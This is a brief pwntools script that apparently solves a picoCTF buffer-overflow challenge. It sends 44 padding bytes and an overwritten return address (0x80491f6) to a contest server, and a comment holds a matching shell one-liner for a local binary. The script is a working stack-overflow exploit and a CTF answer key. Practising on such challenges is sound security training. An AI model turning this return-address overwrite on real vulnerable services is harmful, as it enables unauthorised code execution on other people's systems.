from pwn import *

io = remote("saturn.picoctf.net", 50173)

padding = b"A"*44

addr = p32(0x80491f6)

payload = padding + addr

io.sendlineafter(b"Please enter your string: ", payload)
# io.send(payload)
# io.interactive()
print(io.recvall().decode())

"""
$ python3 -c "import sys; sys.stdout.buffer.write(b'abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqr\xf6\x91\x04\x08')" | ./vuln
"""
